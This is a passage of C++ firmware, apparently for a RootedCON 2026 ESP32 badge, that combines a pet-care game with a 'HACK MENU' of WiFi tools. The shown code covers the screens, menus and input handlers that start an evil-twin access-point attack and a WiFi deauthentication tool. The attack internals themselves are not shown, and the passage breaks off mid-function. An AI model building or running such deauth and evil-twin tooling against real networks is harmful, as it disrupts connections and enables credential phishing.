    case 2: return kHairColor[sid];
    case 3: return kPupil;
    case 4: return kFeatureColor[sid];
    case 5: return kEyeW;
    case 6: return kMouthColor[sid];
    case 7: return kClothColor[sid];
    default: return kBg;
  }
}

void drawCharSprite(uint8_t sid, int16_t x, int16_t y, int16_t s) {
  const uint8_t* sp = kSprites[sid];
  for (int16_t r = 0; r < 10; ++r) {
    for (int16_t c = 0; c < 10; ++c) {
      const uint8_t idx = sp[r * 10 + c];
      if (idx != 0) {
        tft.fillRect(x + c * s, y + r * s, s, s, colorForIndex(sid, idx));
      }
    }
  }
}

void drawHeartIcon(int16_t x, int16_t y, uint16_t color) {
  const int16_t s = 2;
  tft.fillRect(x + 2 * s, y, s, s, color);
  tft.fillRect(x + 4 * s, y, s, s, color);
  tft.fillRect(x + 1 * s, y + s, 2 * s, s, color);
  tft.fillRect(x + 4 * s, y + s, 2 * s, s, color);
  tft.fillRect(x, y + 2 * s, 6 * s, s, color);
  tft.fillRect(x + s, y + 3 * s, 4 * s, s, color);
  tft.fillRect(x + 2 * s, y + 4 * s, 2 * s, s, color);
}

void drawSleepIcon(int16_t x, int16_t y, uint16_t color) {
  tft.setTextColor(color, kBg);
  tft.drawString("Zz", x, y, 2);
}

void drawSparkIcon(int16_t x, int16_t y, uint16_t color) {
  tft.fillRect(x + 6, y, 2, 12, color);
  tft.fillRect(x + 1, y + 5, 12, 2, color);
  tft.fillRect(x + 3, y + 2, 2, 2, color);
  tft.fillRect(x + 9, y + 8, 2, 2, color);
}

void drawPlayIcon(int16_t x, int16_t y, uint16_t color) {
  tft.fillTriangle(x, y, x, y + 12, x + 10, y + 6, color);
  tft.fillRect(x + 12, y + 2, 2, 8, color);
}

void drawAlertIcon(int16_t x, int16_t y, uint16_t color) {
  tft.fillRect(x + 5, y, 2, 9, color);
  tft.fillRect(x + 5, y + 11, 2, 2, color);
}

void drawEffectBubble(EffectId effect, int16_t x, int16_t y) {
  if (effect == FX_NONE) return;
  tft.fillRoundRect(x, y, 22, 18, 4, kPanelAlt);
  tft.drawRoundRect(x, y, 22, 18, 4, kLine);
  switch (effect) {
    case FX_CORAZON: drawHeartIcon(x + 4, y + 4, kPink); break;
    case FX_DORMIR:  drawSleepIcon(x + 3, y + 3, kCyan); break;
    case FX_BRILLO:  drawSparkIcon(x + 4, y + 3, kWhite); break;
    case FX_JUEGO:   drawPlayIcon(x + 4, y + 3, kYellow); break;
    case FX_ALERTA:  drawAlertIcon(x + 7, y + 2, kRed); break;
    default: break;
  }
}

// ---------------------------------------------------------------------------
// HOME view drawing
// ---------------------------------------------------------------------------
void drawFrame() {
  tft.fillScreen(kBg);
}

void drawHomeHeaderStatic() {
  static constexpr char kPwned[] = "pwned by @renvu";
  static constexpr int16_t kCharW = 6;
  const int16_t sub_x =
      (tft.width() - static_cast<int16_t>(strlen(kPwned) * kCharW)) / 2;

  tft.fillRect(0, 0, tft.width(), 25, kBg);
  tft.fillRoundRect(8, 1, tft.width() - 16, 23, 6, kPanel);
  tft.fillRect(10, 3, tft.width() - 20, 11, kPanel);
  tft.setTextColor(kDim, kPanel);
  tft.drawString(kPwned, sub_x, 17, 1);
}

void drawHomeHeaderTitle() {
  static constexpr char kTitle[] = "2026 ROOTEDCON ESP32";
  static constexpr int16_t kCharW = 6;

  const uint8_t phase = static_cast<uint8_t>((millis() / 2) & 0xFF);
  const size_t title_len = strlen(kTitle);
  const int16_t title_x =
      (tft.width() - static_cast<int16_t>(title_len * kCharW)) / 2;
  tft.fillRect(10, 3, tft.width() - 20, 11, kPanel);

  for (size_t i = 0; i < title_len; ++i) {
    const char ch[2] = {kTitle[i], '\0'};
    const uint16_t color = (kTitle[i] == ' ')
                               ? kWhite
                               : rainbowColor(static_cast<uint8_t>(phase + i * 14));
    const int16_t x = title_x + static_cast<int16_t>(i * kCharW);
    tft.setTextColor(color, kPanel);
    tft.drawString(ch, x, 4, 1);
    if (kTitle[i] != ' ') {
      tft.drawString(ch, x + 1, 4, 1);
    }
  }
}

void drawHomeHeader() {
  drawHomeHeaderStatic();
  drawHomeHeaderTitle();
}

void drawHomeBackdrop() {
  tft.fillRoundRect(8, 26, tft.width() - 16, 98, 8, kPanel);
  for (int16_t x = 16; x < tft.width() - 10; x += 10) {
    tft.drawPixel(x, 66, kPanelAlt);
  }
}

void drawHomeFooter() {
  static constexpr char kFooter[] = "@araintel 2026";
  static constexpr int16_t kCharW = 6;
  const int16_t x =
      tft.width() - 12 - static_cast<int16_t>(strlen(kFooter) * kCharW);
  tft.fillRect(12, 111, tft.width() - 24, 11, kPanel);
  tft.setTextColor(kDim, kPanel);
  tft.drawString(kFooter, x, 114, 1);
}

void drawSelectionCell(uint8_t i) {
  constexpr int16_t grid_w = kHomeCell * 2 + kHomeGapX;
  const int16_t ox = (tft.width() - grid_w) / 2;
  const uint8_t col = i % 2;
  const uint8_t row = i / 2;
  const int16_t cx = ox + col * (kHomeCell + kHomeGapX);
  const int16_t cy = kHomeOy + row * (kHomeCell + kHomeGapY);
  const bool sel = (i == g_selected);
  const int16_t bob = sel ? (g_home_bob_toggle ? -2 : 1) : 0;
  const int16_t row_lift = (row == 1) ? -3 : 0;

  tft.fillRect(cx - 1, cy - 1, kHomeCell + 2, kHomeCell + 12, kPanel);
  tft.fillRoundRect(cx, cy, kHomeCell, kHomeCell, 5, kBg);
  drawCharSprite(g_crew[i].sprite_id, cx + 4, cy + 4 + row_lift + bob, 2);

  tft.setTextColor(kNickPurple, kPanel);
  tft.drawCentreString(g_crew[i].nick, cx + kHomeCell / 2, cy + kHomeCell + 1, 1);
}

void drawSelectionGrid() {
  for (uint8_t i = 0; i < kCrewCount; ++i) drawSelectionCell(i);
}

void drawHome() {
  drawFrame();
  drawHomeHeader();
  drawHomeBackdrop();
  drawSelectionGrid();
  drawHomeFooter();
}

// ---------------------------------------------------------------------------
// PET detail view drawing
// ---------------------------------------------------------------------------
void drawStatBar(int16_t x, int16_t y, const char* label, int16_t value, uint16_t color) {
  constexpr int16_t bar_w = 38;
  tft.setTextColor(kDim, kBg);
  tft.drawString(label, x, y, 1);
  tft.drawRect(x + 18, y, bar_w, 6, kLine);
  tft.fillRect(x + 19, y + 1, ((bar_w - 2) * value) / 100, 4, color);
}

void drawPetStatic() {
  const CrewMember& c = g_crew[g_selected];
  tft.fillScreen(kBg);
  tft.drawRect(0, 0, tft.width(), tft.height(), kLine);

  tft.setTextColor(kNickPurple, kBg);
  tft.drawCentreString(c.nick, tft.width() / 2, 6, 2);
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString(moodFor(c), tft.width() / 2, 22, 1);

  tft.drawRoundRect(10, 30, 56, 62, 6, kPanel);
  tft.drawRoundRect(70, 30, 48, 62, 6, kPanel);
  tft.fillRoundRect(74, 72, 40, 14, 4, kNickPurple);
  tft.setTextColor(kWhite, kNickPurple);
  tft.drawCentreString("HACK", 94, 75, 1);

  tft.fillRoundRect(8, 96, tft.width() - 16, 32, 6, kPanel);

  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("ARR COMER  DER JUGAR", tft.width() / 2, 132, 1);
  tft.drawCentreString("IZQ ASEO   ABA DORMIR", tft.width() / 2, 141, 1);
  tft.drawCentreString("SEL MINIJUEGOS EXT SALIR", tft.width() / 2, 150, 1);
}

void drawPetSpritePanel() {
  const CrewMember& c = g_crew[g_selected];
  constexpr int16_t px = 12, py = 32;
  constexpr int16_t pw = 52;
  constexpr int16_t ph = 58;
  constexpr int16_t sc = 3;
  constexpr int16_t sw = 10 * sc;
  constexpr int16_t sh = 10 * sc;
  const int16_t sx = px + ((pw - sw) / 2);
  const int16_t sy = py + 6 + (g_anim_toggle ? -1 : 1);

  tft.fillRect(px + 2, py + 2, pw - 4, ph - 4, kBg);
  drawCharSprite(c.sprite_id, sx, sy, sc);
  drawEffectBubble(currentEffectFor(c), px + pw - 22, py + 2);
}

void drawPetStats() {
  const CrewMember& c = g_crew[g_selected];
  const int16_t bx = 72, by = 32;
  const int16_t bw = 44;
  const int16_t bh = 34;
  tft.fillRect(bx + 2, by + 2, bw - 4, bh - 4, kBg);
  drawStatBar(74, 34, "COM", c.comida,  kYellow);
  drawStatBar(74, 42, "ANI", c.animo,   kPink);
  drawStatBar(74, 50, "ENE", c.energia, kCyan);
  drawStatBar(74, 58, "ASE", c.aseo,    kWhite);
  drawStatBar(74, 66, "SAL", c.salud,   kLime);
}

void drawPetStatus() {
  tft.fillRect(8, 100, tft.width() - 16, 24, kPanel);
  tft.setTextColor(kYellow, kPanel);
  tft.drawCentreString(g_status, tft.width() / 2, 108, 1);
}

void drawPet() {
  drawPetStatic();
  drawPetSpritePanel();
  drawPetStats();
  drawPetStatus();
}

void drawWifi() {
  tft.fillScreen(kBg);
  tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
  tft.setTextColor(kNickPurple, kBg);
  tft.drawCentreString("WIFI", tft.width() / 2, 6, 2);
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("Conecta el movil a 'wifi gratis'", tft.width() / 2, 24, 1);
  tft.drawCentreString("y abre 192.168.4.1", tft.width() / 2, 34, 1);

  tft.drawRoundRect(10, 46, tft.width() - 20, 44, 6, kPanel);
  tft.setTextColor(kText, kBg);
  tft.drawString("SSID AP", 16, 54, 1);
  tft.drawRightString(kPortalSsid, tft.width() - 16, 54, 1);
  tft.drawString("ESTADO", 16, 68, 1);
  tft.drawRightString(g_wifi_status, tft.width() - 16, 68, 1);

  tft.drawRoundRect(10, 96, tft.width() - 20, 24, 6, kPanel);
  tft.setTextColor(kYellow, kBg);
  tft.drawCentreString("SELECT RECONECTAR", tft.width() / 2, 104, 1);
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("EXTRA VOLVER", tft.width() / 2, 150, 1);
}

void drawWifiScan() {
  tft.fillScreen(kBg);
  tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
  tft.setTextColor(kNickPurple, kBg);
  tft.drawCentreString("WIFI SCAN", tft.width() / 2, 6, 2);
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("Visibles y legales", tft.width() / 2, 22, 1);

  const int start = g_scan_offset;
  const int end = min(g_scan_count, start + (int)kScanPageSize);
  int y = 34;
  for (int i = start; i < end; ++i) {
    const String ssid = WiFi.SSID(i).length() ? WiFi.SSID(i) : String("<oculta>");
    tft.drawRoundRect(8, y - 2, tft.width() - 16, 16, 3, kPanel);
    tft.setTextColor(kText, kBg);
    tft.drawString(ssid, 12, y, 1);
    tft.setTextColor(kDim, kBg);
    tft.drawRightString(String(WiFi.RSSI(i)) + "dBm CH" + String(WiFi.channel(i)), tft.width() - 12, y, 1);
    y += 18;
  }

  if (g_scan_count <= 0) {
    tft.setTextColor(kYellow, kBg);
    tft.drawCentreString("Sin resultados", tft.width() / 2, 72, 1);
  }

  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("SELECT REESCANEAR", tft.width() / 2, 142, 1);
  tft.drawCentreString("EXT VOLVER", tft.width() / 2, 152, 1);
}

void drawTwinDetect() {
  tft.fillScreen(kBg);
  tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
  tft.setTextColor(kNickPurple, kBg);
  tft.drawCentreString("TWIN DETECT", tft.width() / 2, 6, 2);
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("SSID duplicados visibles", tft.width() / 2, 22, 1);

  int pairs = 0;
  int row = 0;
  for (int i = 0; i < g_scan_count && row < 4; ++i) {
    const String a = WiFi.SSID(i);
    if (!a.length()) continue;
    for (int j = i + 1; j < g_scan_count && row < 4; ++j) {
      const String b = WiFi.SSID(j);
      if (a == b && a.length()) {
        if (pairs >= g_twin_offset && row < 4) {
          const int y = 36 + row * 22;
          tft.drawRoundRect(8, y - 2, tft.width() - 16, 18, 3, kPanel);
          tft.setTextColor(kText, kBg);
          tft.drawString(a, 12, y, 1);
          tft.setTextColor(kDim, kBg);
          tft.drawRightString(String(WiFi.channel(i)) + "/" + String(WiFi.channel(j)), tft.width() - 12, y, 1);
          ++row;
        }
        ++pairs;
      }
    }
  }
  g_twin_count = pairs;
  if (pairs == 0) {
    tft.setTextColor(kYellow, kBg);
    tft.drawCentreString("No se detectan twins", tft.width() / 2, 72, 1);
  }
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("SELECT REESCANEAR", tft.width() / 2, 142, 1);
  tft.drawCentreString("EXT VOLVER", tft.width() / 2, 152, 1);
}

void drawWifiDeauth() {
  tft.fillScreen(kBg);
  tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
  tft.setTextColor(kNickPurple, kBg);
  tft.drawCentreString("WIFI DEAUTH", tft.width() / 2, 6, 2);
  tft.setTextColor(kYellow, kBg);
  tft.drawCentreString("DEAUTH", tft.width() / 2, 22, 1);

  int y = 34;
  for (int i = 0; i < 5 && i < 16; ++i) {
    if (!WifiDeauthTool::networks[i].ssid.length()) break;
    const bool sel = bytesToStr(WifiDeauthTool::selectedNetwork.bssid, 6) == bytesToStr(WifiDeauthTool::networks[i].bssid, 6);
    tft.drawRoundRect(8, y - 2, tft.width() - 16, 16, 3, sel ? kNickPurple : kPanel);
    tft.setTextColor(sel ? kWhite : kText, kBg);
    tft.drawString(WifiDeauthTool::networks[i].ssid, 12, y, 1);
    tft.setTextColor(kDim, kBg);
    tft.drawRightString("CH " + String(WifiDeauthTool::networks[i].ch), tft.width() - 12, y, 1);
    y += 18;
  }

  tft.setTextColor(WifiDeauthTool::enabled ? kYellow : kDim, kBg);
  tft.drawCentreString(WifiDeauthTool::enabled ? "SELECT: DEAUTH ON" : "SELECT: DEAUTH OFF", tft.width() / 2, 142, 1);
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("EXT VOLVER", tft.width() / 2, 152, 1);
}

void drawHashTool() {
  const String input = currentToolInput(g_hash_source);
  const String md5 = md5Hex(input);
  const String sha = sha256Hex(input);
  tft.fillScreen(kBg);
  tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
  tft.setTextColor(kNickPurple, kBg);
  tft.drawCentreString("HASH", tft.width() / 2, 6, 2);
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString(currentToolSourceLabel(g_hash_source), tft.width() / 2, 22, 1);

  tft.drawRoundRect(8, 30, tft.width() - 16, 22, 4, kPanel);
  tft.setTextColor(kText, kBg);
  tft.drawCentreString(input, tft.width() / 2, 38, 1);

  tft.setTextColor(kYellow, kBg);
  tft.drawString("MD5", 10, 58, 1);
  tft.setTextColor(kText, kBg);
  tft.drawString(md5.substring(0, 16), 10, 70, 1);
  tft.drawString(md5.substring(16), 10, 80, 1);

  tft.setTextColor(kCyan, kBg);
  tft.drawString("SHA256", 10, 94, 1);
  tft.setTextColor(kText, kBg);
  for (int i = 0; i < 4; ++i) {
    tft.drawString(sha.substring(i * 16, i * 16 + 16), 10, 106 + i * 10, 1);
  }

  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("ARR/ABA FUENTE  EXT VOLVER", tft.width() / 2, 150, 1);
}

void drawCipherTool() {
  const String input = currentToolInput(g_cipher_source);
  const String ces = caesarText(input, 3);
  const String xh = xorHex(input, "ARA");
  tft.fillScreen(kBg);
  tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
  tft.setTextColor(kNickPurple, kBg);
  tft.drawCentreString("CIFRADOR", tft.width() / 2, 6, 2);
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString(currentToolSourceLabel(g_cipher_source), tft.width() / 2, 22, 1);

  tft.drawRoundRect(8, 30, tft.width() - 16, 22, 4, kPanel);
  tft.setTextColor(kText, kBg);
  tft.drawCentreString(input, tft.width() / 2, 38, 1);

  tft.setTextColor(kYellow, kBg);
  tft.drawString("CESAR+3", 10, 60, 1);
  tft.setTextColor(kText, kBg);
  tft.drawString(ces, 10, 72, 1);

  tft.setTextColor(kCyan, kBg);
  tft.drawString("XOR ARA", 10, 92, 1);
  tft.setTextColor(kText, kBg);
  tft.drawString(xh.substring(0, min((int)xh.length(), 24)), 10, 104, 1);
  if (xh.length() > 24) tft.drawString(xh.substring(24, min((int)xh.length(), 48)), 10, 114, 1);

  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("ARR/ABA FUENTE  EXT VOLVER", tft.width() / 2, 150, 1);
}

void drawLogsTool() {
  tft.fillScreen(kBg);
  tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
  tft.setTextColor(kNickPurple, kBg);
  tft.drawCentreString("LOGS", tft.width() / 2, 6, 2);
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("Eventos del badge", tft.width() / 2, 22, 1);

  int start = g_log_offset;
  int end = min((int)g_log_count, start + 6);
  int y = 36;
  for (int i = start; i < end; ++i) {
    tft.drawRoundRect(8, y - 2, tft.width() - 16, 14, 3, kPanel);
    tft.setTextColor(kText, kBg);
    tft.drawString(g_logs[i], 12, y, 1);
    y += 18;
  }
  if (g_log_count == 0) {
    tft.setTextColor(kYellow, kBg);
    tft.drawCentreString("Sin logs", tft.width() / 2, 72, 1);
  }

  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("ARR/ABA SCROLL", tft.width() / 2, 142, 1);
  tft.drawCentreString("SEL LIMPIAR  EXT VOLVER", tft.width() / 2, 152, 1);
}

const char* miniGameLabelFor(uint8_t option) {
    static const char* labels[8] = {
      "WIFI CFG",   // portal local de configuracion
      "WIFI SCAN",  // escaner de redes: SSID/RSSI/CH/enc
      "TWIN DET",   // detector defensivo de Evil Twin
      "EVILTWIN",   // ataque EvilTwin
      "WIFI DEAUTH",// NUEVA HERRAMIENTA: deautenticación WiFi
      "CIFRADOR",
      "HASH",
      "LOGS",
    };
    return labels[option % 8];
}

void drawMiniGames() {
  tft.fillScreen(kBg);
  tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
  tft.setTextColor(kNickPurple, kBg);
  tft.drawCentreString(g_crew[g_selected].nick, tft.width() / 2, 6, 2);
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("HACK MENU", tft.width() / 2, 22, 1);

  // Contenedor para 8 herramientas con espaciado de 13px c/u
  tft.drawRoundRect(12, 28, tft.width() - 24, 117, 6, kPanel);

  for (uint8_t i = 0; i < 8; ++i) {
    const int16_t y   = 32 + i * 13;
    const bool    sel = (i == g_game_selected);
    const bool    is_wifi_tool = (i < 5); // hasta WIFI DEAUTH
    const uint16_t fill   = sel ? kNickPurple : kPanel;
    const uint16_t border = sel ? kWhite      : kLine;
    const uint16_t txt    = sel ? kWhite : (is_wifi_tool ? kCyan : kText);
    tft.fillRoundRect(18, y, tft.width() - 36, 11, 3, fill);
    tft.drawRoundRect(18, y, tft.width() - 36, 11, 3, border);
    tft.setTextColor(txt, fill);
    tft.drawCentreString(miniGameLabelFor(i), tft.width() / 2, y + 2, 1);
  }
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("ARR/ABA MOVER", tft.width() / 2, 146, 1);
  tft.drawCentreString("SEL ENTRAR  EXT VOLVER", tft.width() / 2, 156, 1);
}

void goEvilTwin() {
  eviltwin_active = true;
  g_view = VIEW_EVILTWIN;
  g_full_redraw = true;
  initEvilTwin();
}

void redraw() {
  if (!g_full_redraw) return;
  if (g_view == VIEW_HOME) {
    drawHome();
    g_header_dirty = false;
    g_home_dirty = false;
    g_home_dirty_mask = 0;
  } else if (g_view == VIEW_PET) {
    drawPet();
    g_pet_sprite_dirty = false;
    g_pet_stats_dirty = false;
  } else if (g_view == VIEW_MINIJUEGOS) {
    drawMiniGames();
  } else if (g_view == VIEW_WIFI) {
    drawWifi();
    g_wifi_dirty = false;
  } else if (g_view == VIEW_WIFI_SCAN) {
    drawWifiScan();
    g_scan_dirty = false;
  } else if (g_view == VIEW_TWIN_DETECT) {
    drawTwinDetect();
    g_twin_dirty = false;
  } else if (g_view == VIEW_WIFI_DEAUTH) {
    drawWifiDeauth();
  } else if (g_view == VIEW_EVILTWIN) {
    drawEvilTwin();
  } else if (g_view == VIEW_HASH_TOOL) {
    drawHashTool();
  } else if (g_view == VIEW_CIPHER_TOOL) {
    drawCipherTool();
  } else if (g_view == VIEW_LOGS_TOOL) {
    drawLogsTool();
  }
  g_full_redraw = false;
}

void updateHomeView() {
  if (g_header_dirty) {
    drawHomeHeaderTitle();
    g_header_dirty = false;
  }
  if (!g_home_dirty) return;
  for (uint8_t i = 0; i < kCrewCount; ++i) {
    if (g_home_dirty_mask & (1 << i)) drawSelectionCell(i);
  }
  g_home_dirty_mask = 0;
  g_home_dirty = false;
}

void updatePetView() {
  if (g_pet_sprite_dirty) {
    drawPetSpritePanel();
    g_pet_sprite_dirty = false;
  }
  if (g_pet_stats_dirty) {
    drawPetStats();
    drawPetStatus();
    g_pet_stats_dirty = false;
  }
}

void updateWifiView() {
  if (!g_wifi_dirty) return;
  drawWifi();
  g_wifi_dirty = false;
}

// ---------------------------------------------------------------------------
// Navigation
// ---------------------------------------------------------------------------
void goHome() {
  g_view = VIEW_HOME;
  g_status = "PULSA SELECT PARA CUIDAR";
  g_full_redraw = true;
  g_header_dirty = true;
  g_home_dirty = true;
  g_home_dirty_mask = 0x0F;
  markSaveDirty();
}

void goPet() {
  g_view = VIEW_PET;
  if (g_boot_decay_applied) {
    g_status = g_boot_decay_msg;
    g_boot_decay_applied = false;
  } else {
    g_status = "CUIDALO O JUEGA";
  }
  g_full_redraw = true;
  g_pet_sprite_dirty = true;
  g_pet_stats_dirty = true;
}

void goMiniGames() {
  g_view = VIEW_MINIJUEGOS;
  g_game_selected = 0;
  g_full_redraw = true;
}

void goWifiSetup() {
  g_view = VIEW_WIFI;
  startWifiPortal();
  g_full_redraw = true;
  g_wifi_dirty = true;
}

// Navega a la vista de escaneo WiFi.
// Muestra mensaje "Escaneando..." y hace el scan bloqueante (~2-3s).
void goWifiScan() {
  g_view        = VIEW_WIFI_SCAN;
  g_scan_offset = 0;
  g_full_redraw = true;

  // Mensaje inmediato antes del scan bloqueante
  tft.fillScreen(kBg);
  tft.setTextColor(kNickPurple, kBg);
  tft.drawCentreString("WIFI SCAN", tft.width() / 2, 50, 2);
  tft.setTextColor(kYellow, kBg);
  tft.drawCentreString("Escaneando...", tft.width() / 2, 80, 1);

  // Asegurar que WiFi está encendido
  if (WiFi.getMode() == WIFI_OFF) WiFi.mode(WIFI_STA);

  // Scan sincrónico: false=blocking, true=incluir redes ocultas
  const int found = WiFi.scanNetworks(false, true);
  g_scan_count = (found < 0) ? 0 : found;
}

// Navega a la vista de detección de Evil Twin.
// Reutiliza los resultados del último scan o hace uno nuevo.
void goTwinDetect() {
  g_view        = VIEW_TWIN_DETECT;
  g_twin_offset = 0;
  g_twin_count  = 0;
  g_full_redraw = true;

  tft.fillScreen(kBg);
  tft.setTextColor(kNickPurple, kBg);
  tft.drawCentreString("TWIN DETECT", tft.width() / 2, 50, 2);
  tft.setTextColor(kYellow, kBg);
  tft.drawCentreString("Buscando twins...", tft.width() / 2, 80, 1);

  if (WiFi.getMode() == WIFI_OFF) WiFi.mode(WIFI_STA);

  const int found = WiFi.scanNetworks(false, true);
  g_scan_count = (found < 0) ? 0 : found;
}

void goWifiDeauth() {
  WifiDeauthTool::init();
  g_view = VIEW_WIFI_DEAUTH;
  addLog("WIFI DEAUTH demo");
  g_full_redraw = true;
}

void goHashTool() {
  g_view = VIEW_HASH_TOOL;
  g_hash_source = 0;
  addLog("HASH");
  g_full_redraw = true;
}

void goCipherTool() {
  g_view = VIEW_CIPHER_TOOL;
  g_cipher_source = 0;
  addLog("CIFRADOR");
  g_full_redraw = true;
}

void goLogsTool() {
  g_view = VIEW_LOGS_TOOL;
  g_log_offset = 0;
  g_full_redraw = true;
}

// ---------------------------------------------------------------------------
// Input handling
// ---------------------------------------------------------------------------
void handleHomeInput() {
  if (menuPressed(BTN_LEFT) || menuPressed(BTN_UP)) {
    const uint8_t prev = g_selected;
    g_selected = (g_selected + kCrewCount - 1) % kCrewCount;
    g_home_dirty_mask |= (1 << prev) | (1 << g_selected);
    g_home_dirty = true;
    markSaveDirty();
  }
  if (menuPressed(BTN_RIGHT) || menuPressed(BTN_DOWN)) {
    const uint8_t prev = g_selected;
    g_selected = (g_selected + 1) % kCrewCount;
    g_home_dirty_mask |= (1 << prev) | (1 << g_selected);
    g_home_dirty = true;
    markSaveDirty();
  }
  if (menuPressed(BTN_SELECT)) goPet();
}

void handlePetInput() {
  CrewMember& c = g_crew[g_selected];
  if (menuPressed(BTN_EXTRA)) { goHome(); return; }
  if (menuPressed(BTN_SELECT)) { goMiniGames(); return; }
  if (menuPressed(BTN_UP))     { applyAction(c, BTN_UP);     g_pet_stats_dirty = true; }
  if (menuPressed(BTN_RIGHT))  { applyAction(c, BTN_RIGHT);  g_pet_stats_dirty = true; }
  if (menuPressed(BTN_DOWN))   { applyAction(c, BTN_DOWN);   g_pet_stats_dirty = true; }
  if (menuPressed(BTN_LEFT))   { applyAction(c, BTN_LEFT);   g_pet_stats_dirty = true; }
}

void handleMiniGamesInput() {
  if (menuPressed(BTN_EXTRA)) { goPet(); return; }
  // Navegación circular entre 8 ítems
  if (menuPressed(BTN_UP) || menuPressed(BTN_LEFT)) {
    g_game_selected = (g_game_selected + 7) % 8;
    g_full_redraw = true;
    return;
  }
  if (menuPressed(BTN_DOWN) || menuPressed(BTN_RIGHT)) {
    g_game_selected = (g_game_selected + 1) % 8;
    g_full_redraw = true;
    return;
  }
  if (menuPressed(BTN_SELECT)) {
    CrewMember& c = g_crew[g_selected];
    const char* tool = miniGameLabelFor(g_game_selected);
    if (g_game_selected == 0) {
      g_status = "Portal WiFi activo";
      goWifiSetup();
      return;
    } else if (g_game_selected == 1) {
      c.animo   = clampStat(c.animo   + 3);
      c.energia = clampStat(c.energia - 4);
      recomputeHealth(c);
      markSaveDirty();
      g_status = "Escaneando redes...";
      goWifiScan();
      return;
    } else if (g_game_selected == 2) {
      c.animo   = clampStat(c.animo   + 4);
      c.energia = clampStat(c.energia - 5);
      recomputeHealth(c);
      markSaveDirty();
      g_status = "Buscando evil twins...";
      goTwinDetect();
      return;
    } else if (g_game_selected == 3) {
      // EVILTWIN
      c.animo   = clampStat(c.animo   + 7);
      c.energia = clampStat(c.energia - 8);
      g_status  = String("EvilTwin activo");
      setEffect(FX_ALERTA);
      goEvilTwin();
      return;
    } else if (g_game_selected == 4) {
      c.animo   = clampStat(c.animo   + 6);
      c.energia = clampStat(c.energia - 5);
      c.salud   = clampStat(c.salud   + 2);
      g_status  = String("WiFi Deauth activo");
      setEffect(FX_ALERTA);
      goWifiDeauth();
      return;
    } else if (g_game_selected == 5) {
      c.animo   = clampStat(c.animo + 5);
      c.energia = clampStat(c.energia - 2);
      recomputeHealth(c);
      markSaveDirty();
      g_status  = "Abriendo cifrador";
      setEffect(FX_BRILLO);
      goCipherTool();
      return;
    } else if (g_game_selected == 6) {
      c.animo   = clampStat(c.animo + 4);
      c.energia = clampStat(c.energia - 2);
      recomputeHealth(c);
      markSaveDirty();
      g_status  = "Calculando hash";
      setEffect(FX_BRILLO);
      goHashTool();
      return;
    } else {
      g_status  = "Abriendo logs";
      goLogsTool();
      return;
    }
  }
}

void handleWifiInput() {
  if (menuPressed(BTN_EXTRA)) {
    stopWifiPortal();
    goMiniGames();
    return;
  }
  if (menuPressed(BTN_SELECT)) {
    connectSavedWifi();
    g_wifi_dirty = true;
  }
}

void handleWifiScanInput() {
  if (menuPressed(BTN_EXTRA)) {
    WiFi.scanDelete();
    g_scan_count = 0;
    goMiniGames();
    return;
  }
  // SEL = reescanear
  if (menuPressed(BTN_SELECT)) {
    goWifiScan();
    return;
  }
  // Scroll hacia adelante
  if (menuPressed(BTN_DOWN) || menuPressed(BTN_RIGHT)) {
    if (g_scan_count > 0 &&
        (int)(g_scan_offset + kScanPageSize) < g_scan_count) {
      g_scan_offset += kScanPageSize;
      g_full_redraw = true;
    }
  }
  // Scroll hacia atrás
  if (menuPressed(BTN_UP) || menuPressed(BTN_LEFT)) {
    if (g_scan_offset >= kScanPageSize) {
      g_scan_offset -= kScanPageSize;
      g_full_redraw = true;
    }
  }
}

void handleTwinDetectInput() {
  if (menuPressed(BTN_EXTRA)) {
    WiFi.scanDelete();
    g_scan_count = 0;
    g_twin_count = 0;
    goMiniGames();
    return;
  }
  // SEL = reescanear
  if (menuPressed(BTN_SELECT)) {
    goTwinDetect();
    return;
  }
  // Scroll hacia adelante (2 pares por página)
  if (menuPressed(BTN_DOWN) || menuPressed(BTN_RIGHT)) {
    if ((int)(g_twin_offset + 2) < g_twin_count) {
      g_twin_offset += 2;
      g_full_redraw = true;
    }
  }
  // Scroll hacia atrás
  if (menuPressed(BTN_UP) || menuPressed(BTN_LEFT)) {
    if (g_twin_offset >= 2) {
      g_twin_offset -= 2;
      g_full_redraw = true;
    }
  }
}

void handleWifiDeauthInput() {
  WifiDeauthTool::tick();
  if (menuPressed(BTN_EXTRA)) {
    goMiniGames();
    return;
  }

  int idx = -1;
  for (int i = 0; i < 16; ++i) {
    if (WifiDeauthTool::networks[i].ssid == "") break;
    if (bytesToStr(WifiDeauthTool::selectedNetwork.bssid, 6) == bytesToStr(WifiDeauthTool::networks[i].bssid, 6)) {
      idx = i;
      break;
    }
  }

  // Navegación por la lista
  if (menuPressed(BTN_UP) || menuPressed(BTN_LEFT)) {
    if (idx > 0) {
      WifiDeauthTool::selectedNetwork = WifiDeauthTool::networks[idx - 1];
      g_full_redraw = true;
    }
    return;
  }
  if (menuPressed(BTN_DOWN) || menuPressed(BTN_RIGHT)) {
    if (idx >= 0 && idx < 15 && WifiDeauthTool::networks[idx + 1].ssid.length()) {
      WifiDeauthTool::selectedNetwork = WifiDeauthTool::networks[idx + 1];
      g_full_redraw = true;
    }
    return;
  }

  // Al pulsar SELECT sobre una red, selecciona y activa deauth
  if (menuPressed(BTN_SELECT)) {
